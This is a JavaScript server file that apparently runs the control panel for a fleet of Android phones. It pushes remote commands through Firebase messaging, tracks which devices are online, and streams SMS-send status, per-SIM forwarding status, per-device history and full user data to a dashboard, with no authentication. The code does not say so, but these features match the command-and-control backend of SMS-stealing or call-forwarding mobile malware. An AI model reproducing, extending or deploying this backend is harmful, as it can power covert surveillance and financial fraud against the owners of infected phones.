import dotenv from "dotenv";
dotenv.config();

import express from "express";
import cors from "cors";
import { createServer } from "http";
import { Server } from "socket.io";

import { firestore, rtdb, fcm } from "./config/db.js";

import userFullDataRoutes from "./routes/userFullDataRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import notificationRoutes from "./routes/smsRoutes.js";
import checkRoutes from "./routes/checkRoutes.js";
import commandRoutes from "./routes/commandRoutes.js";

const PORT = process.env.PORT || 5000;
const app = express();
const server = createServer(app);

app.use(cors());
app.use(express.json());

/* ---------------- SOCKET.IO SETUP ---------------- */
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.set("io", io);

const deviceSockets = new Map();
let lastDevicesList = [];

/* ---------------- ID Cleaner ---------------- */
const clean = (id) => id?.toString()?.trim()?.toUpperCase();

/* ======================================================
      HIGH PRIORITY FCM PUSHER
====================================================== */
async function sendFcmHighPriority(token, type, payload = {}) {
  if (!token) {
    console.log("⚠️ Missing FCM Token");
    return;
  }

  try {
    const msg = {
      token,
      android: { priority: "high" },
      data: {
        type: String(type || ""),
        payload: JSON.stringify(payload || {}),
      },
    };

    const res = await fcm.send(msg);
    console.log("📨 FCM SENT:", type, res);
  } catch (err) {
    console.error("❌ FCM ERROR:", err.message);
  }
}

/* ======================================================
      BUILD DEVICES LIST
====================================================== */
async function buildDevicesList() {
  const [devSnap, statusSnap] = await Promise.all([
    rtdb.ref("registeredDevices").get(),
    rtdb.ref("status").get(),
  ]);

  if (!devSnap.exists()) return [];

  const devs = devSnap.val() || {};
  const stats = statusSnap.exists() ? statusSnap.val() : {};

  return Object.entries(devs).map(([id, info]) => {
    const st = stats[id] || {};
    return {
      id,
      ...info,
      connectivity: st.connectivity || "Offline",
      lastSeen: st.lastSeen || st.timestamp || null,
      timestamp: st.timestamp || null,
    };
  });
}

/* ======================================================
      REFRESH DEVICES LIVE
====================================================== */
async function refreshDevicesLive(reason = "") {
  try {
    const devices = await buildDevicesList();

    lastDevicesList = devices;

    io.emit("devicesLive", {
      success: true,
      reason,
      count: devices.length,
      data: devices,
    });

    console.log(`📡 devicesLive pushed (${reason}) → ${devices.length} devices`);
  } catch (err) {
    console.error("❌ refreshDevicesLive ERROR:", err.message);
  }
}

/* ======================================================
      SOCKET.IO HANDLING
====================================================== */
io.on("connection", (socket) => {
  console.log("🔗 Client Connected:", socket.id);

  let currentDeviceId = null;

  socket.emit("devicesLive", {
    success: true,
    count: lastDevicesList.length,
    data: lastDevicesList,
  });

  socket.on("registerDevice", async (rawId) => {
    const id = clean(rawId);
    if (!id) return;

    deviceSockets.set(id, socket.id);
    currentDeviceId = id;

    console.log("📱 Device Registered via Socket:", id);

    await rtdb.ref(`status/${id}`).set({
      connectivity: "Online",
      lastSeen: Date.now(),
      timestamp: Date.now(),
    });

    io.emit("deviceStatus", { id, connectivity: "Online" });

    refreshDevicesLive(`deviceOnline:${id}`);
  });

  socket.on("disconnect", async () => {
    console.log("🔌 Client Disconnected:", socket.id);
    if (currentDeviceId) {
      await rtdb.ref(`status/${currentDeviceId}`).set({
        connectivity: "Offline",
        lastSeen: Date.now(),
        timestamp: Date.now(),
      });

      io.emit("deviceStatus", {
        id: currentDeviceId,
        connectivity: "Offline",
      });

      refreshDevicesLive(`deviceOffline:${currentDeviceId}`);
    }
  });
});

/* ======================================================
      LEGACY /send-command
====================================================== */
app.post("/send-command", async (req, res) => {
  try {
    const { uniqueid, title, message } = req.body;
    const id = clean(uniqueid);

    await rtdb.ref(`commands/${id}`).set({
      title,
      message,
      timestamp: Date.now(),
    });

    return res.json({ success: true });
  } catch (err) {
    console.error("❌ Error send-command:", err.message);
    return res.status(500).json({ success: false });
  }
});

/* ======================================================
      BRO_REPLY WATCH LOGIC
====================================================== */
const liveReplyWatchers = new Map();

function stopReplyWatcher(uid) {
  if (liveReplyWatchers.has(uid)) {
    const ref = liveReplyWatchers.get(uid);
    ref.off();
    liveReplyWatchers.delete(uid);
    console.log("🛑 Reply watcher stopped:", uid);
  }
}

function startReplyWatcher(uid) {
  const ref = rtdb.ref(`checkOnline/${uid}`);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      io.emit("brosReplyUpdate", {
        uid,
        success: true,
        data: null,
        message: "No reply found",
      });
      return;
    }

    const data = snap.val();
    console.log("🔥 LIVE brosReply:", uid, data);

    io.emit("brosReplyUpdate", {
      uid,
      success: true,
      data: { uid, ...data },
    });
  });

  liveReplyWatchers.set(uid, ref);
  console.log("🎧 Reply watcher started:", uid);
}

app.get("/api/brosreply/:uid", async (req, res) => {
  try {
    const uid = req.params.uid;

    stopReplyWatcher(uid);

    const snap = await rtdb.ref(`checkOnline/${uid}`).get();
    const data = snap.exists() ? { uid, ...snap.val() } : null;

    startReplyWatcher(uid);

    return res.json({
      success: true,
      data,
      message: "Live listening started",
    });
  } catch (err) {
    console.error("❌ brosreply ERROR:", err.message);
    res.status(500).json({ success: false });
  }
});

/* ======================================================
      ADMIN UPDATE PUSHER
====================================================== */
rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
  if (!snap.exists()) return;

  const adminData = snap.val();
  console.log("🛠 Admin updated:", adminData);

  const all = await rtdb.ref("registeredDevices").get();
  if (!all.exists()) return;

  all.forEach((child) => {
    const token = child.val()?.fcmToken;
    if (token) {
      sendFcmHighPriority(token, "ADMIN_UPDATE", {
        deviceId: child.key,
        ...adminData,
      });
    }
  });
});

/* ======================================================
      DEVICE COMMAND CENTER
====================================================== */
function extractCommandData(raw) {
  if (raw?.action) return raw;
  const keys = Object.keys(raw || {});
  return raw[keys[keys.length - 1]] || null;
}

async function handleDeviceCommandChange(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;
  const raw = snap.val();
  const cmd = extractCommandData(raw);
  if (!cmd) return;

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;
  if (!token) return;

  await sendFcmHighPriority(token, "DEVICE_COMMAND", {
    uniqueid: uid,
    ...cmd,
  });
}

rtdb.ref("commandCenter/deviceCommands").on("child_added", handleDeviceCommandChange);
rtdb.ref("commandCenter/deviceCommands").on("child_changed", handleDeviceCommandChange);

/* ======================================================
      ⭐ CHECK ONLINE — RESET CLOCK + 5s COOLDOWN ⭐
====================================================== */

const checkCooldown = new Map();
const COOLDOWN_MS = 5000; // 5 sec gap

async function handleCheckOnlineChange(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;
  const data = snap.val() || {};
  const now = Date.now();

  // ✔ Debounce prevent duplicate quick triggers
  if (checkCooldown.has(uid) && now - checkCooldown.get(uid) < COOLDOWN_MS) {
    console.log("⏳ Skipped CHECK_ONLINE (cooldown):", uid);
    return;
  }

  checkCooldown.set(uid, now);

  await rtdb.ref(`resetCollection/${uid}`).set({
    resetAt: now,
    readable: new Date(now).toString(),
  });

  await rtdb.ref(`status/${uid}`).update({
    connectivity: "Online",
    lastSeen: now,
    timestamp: now,
  });

  console.log(`♻️ RESET CLOCK UPDATED for ${uid}`);

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;
  if (!token) return;

  await sendFcmHighPriority(token, "CHECK_ONLINE", {
    uniqueid: uid,
    available: data.available || "unknown",
    checkedAt: String(data.checkedAt || ""),
  });
}

rtdb.ref("checkOnline").on("child_added", handleCheckOnlineChange);
rtdb.ref("checkOnline").on("child_changed", handleCheckOnlineChange);

/* ======================================================
      RESTART CONTROL
====================================================== */
app.post("/restart/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);
    const now = Date.now();

    await rtdb.ref(`restart/${uid}`).set({
      restartAt: now,
      readable: new Date(now).toString(),
    });

    return res.json({ success: true, restartAt: now });
  } catch (err) {
    console.error("❌ restart set ERROR:", err.message);
    res.status(500).json({ success: false });
  }
});

const RESTART_EXPIRY = 15 * 60 * 1000;

app.get("/restart/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);

    const snap = await rtdb.ref(`restart/${uid}`).get();
    if (!snap.exists()) {
      return res.json({ success: true, data: null });
    }

    const data = snap.val();
    const diff = Date.now() - Number(data.restartAt);

    if (diff > RESTART_EXPIRY) {
      await rtdb.ref(`restart/${uid}`).remove();
      return res.json({ success: true, data: null });
    }

    return res.json({
      success: true,
      data: {
        uid,
        restartAt: data.restartAt,
        readable: data.readable,
        age: diff,
      },
    });
  } catch (err) {
    console.error("❌ restart get ERROR:", err.message);
    res.status(500).json({ success: false });
  }
});

/* ======================================================
      LAST CHECK API
====================================================== */
function formatAgo(ms) {
  const sec = Math.floor((Date.now() - ms) / 1000);
  if (sec < 60) return `${sec} sec`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} min`;
  const hr = Math.floor(min / 60);
  if (hr < 24) return `${hr} hr`;
  const day = Math.floor(hr / 24);
  return `${day} days`;
}

app.get("/api/lastcheck/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);
    const snap = await rtdb.ref(`status/${uid}`).get();

    if (!snap.exists()) {
      return res.json({ success: false, message: "No status found" });
    }

    const st = snap.val();
    const ts = st.timestamp || st.lastSeen || 0;

    return res.json({
      success: true,
      uid,
      lastCheckAt: ts,
      readable: ts ? formatAgo(ts) : "N/A",
    });
  } catch (err) {
    console.error("❌ lastcheck ERROR:", err.message);
    res.status(500).json({ success: false });
  }
});

/* ======================================================
      SMS STATUS + SIM FORWARD LIVE WATCH
====================================================== */

const smsStatusRef = rtdb.ref("smsStatus");

function handleSmsStatusSingle(uid, msgId, data, event) {
  io.emit("smsStatusUpdate", {
    success: true,
    uid,
    msgId,
    event,
    data,
  });

  console.log(
    `📩 smsStatusUpdate → uid=${uid}, msgId=${msgId}, event=${event}, status=${data?.status}`
  );
}

smsStatusRef.on("child_added", (snap) => {
  const uid = snap.key;
  const all = snap.val() || {};

  Object.entries(all).forEach(([msgId, obj]) => {
    handleSmsStatusSingle(uid, msgId, obj, "added");
  });
});

smsStatusRef.on("child_changed", (snap) => {
  const uid = snap.key;
  const all = snap.val() || {};

  Object.entries(all).forEach(([msgId, obj]) => {
    handleSmsStatusSingle(uid, msgId, obj, "changed");
  });
});

smsStatusRef.on("child_removed", (snap) => {
  const uid = snap.key;

  io.emit("smsStatusUpdate", {
    success: true,
    uid,
    msgId: null,
    data: null,
    event: "removed",
  });

  console.log(`🗑 smsStatus removed for uid=${uid}`);
});


const simForwardRef = rtdb.ref("simForwardStatus");

function handleSimForwardChange(snap, event = "update") {
  const uid = snap.key;

  if (!snap.exists()) {
    io.emit("simForwardStatusUpdate", {
      success: true,
      uid,
      event,
      sims: {
        0: null,
        1: null,
      },
    });

    console.log(`📶 simForwardStatus → uid=${uid}, removed`);
    return;
  }

  const raw = snap.val() || {};

  const sim0 = raw["0"]
    ? { status: raw["0"].status || "unknown", updatedAt: raw["0"].updatedAt || null }
    : null;

  const sim1 = raw["1"]
    ? { status: raw["1"].status || "unknown", updatedAt: raw["1"].updatedAt || null }
    : null;

  const sims = { 0: sim0, 1: sim1 };

  io.emit("simForwardStatusUpdate", {
    success: true,
    uid,
    event,
    sims,
  });

  console.log(
    `📶 simForwardStatusUpdate → uid=${uid}, event=${event}, SIM0=${sim0?.status || "null"}, SIM1=${sim1?.status || "null"}`
  );
}

simForwardRef.on("child_added", (snap) =>
  handleSimForwardChange(snap, "added")
);
simForwardRef.on("child_changed", (snap) =>
  handleSimForwardChange(snap, "changed")
);
simForwardRef.on("child_removed", (snap) =>
  handleSimForwardChange(snap, "removed")
);


/* ======================================================
      REGISTERED DEVICES LIVE UPDATE
====================================================== */
const registeredDevicesRef = rtdb.ref("registeredDevices");

registeredDevicesRef.on("child_added", () => {
  refreshDevicesLive("registered_added");
});

registeredDevicesRef.on("child_changed", () => {
  refreshDevicesLive("registered_changed");
});

registeredDevicesRef.on("child_removed", () => {
  refreshDevicesLive("registered_removed");
});


app.get("/api/devices", async (req, res) => {
  try {
    const devices = await buildDevicesList();
    return res.json({
      success: true,
      count: devices.length,
      data: devices,
    });
  } catch (err) {
    console.error(" /api/devices ERROR:", err.message);
    res.status(500).json({ success: false });
  }
});

/* ======================================================
      ⭐ HISTORY LIVE WATCH ⭐
====================================================== */

const historyRef = rtdb.ref("history");

function emitHistoryUpdate(uid, entryId, obj, event) {
  io.emit("historyUpdate", {
    success: true,
    uid,
    entryId,
    event,
    data: obj
  });

  console.log(
    `📜 historyUpdate → uid=${uid}, entry=${entryId}, event=${event}, type=${obj?.entryType}`
  );
}

// When new history item inserted
historyRef.on("child_added", (snap) => {
  const uid = snap.key;
  const entries = snap.val() || {};

  Object.entries(entries).forEach(([entryId, obj]) => {
    emitHistoryUpdate(uid, entryId, obj, "added");
  });
});

// When history entries change
historyRef.on("child_changed", (snap) => {
  const uid = snap.key;
  const entries = snap.val() || {};

  Object.entries(entries).forEach(([entryId, obj]) => {
    emitHistoryUpdate(uid, entryId, obj, "changed");
  });
});

// When history deleted/reset
historyRef.on("child_removed", (snap) => {
  const uid = snap.key;

  io.emit("historyUpdate", {
    success: true,
    uid,
    entryId: null,
    event: "removed",
    data: null
  });

  console.log(`📜 history removed for uid=${uid}`);
});

/* ======================================================
      ROUTES
====================================================== */

refreshDevicesLive("initial");

app.use(adminRoutes);
app.use("/api/sms", notificationRoutes);
app.use("/api", checkRoutes);
app.use("/api", userFullDataRoutes);
app.use(commandRoutes);

app.get("/", (_, res) => {
  res.send(" RTDB + Socket.IO Backend Running");
});

server.listen(PORT, () => {
  console.log(` Server running on PORT ${PORT}`);
});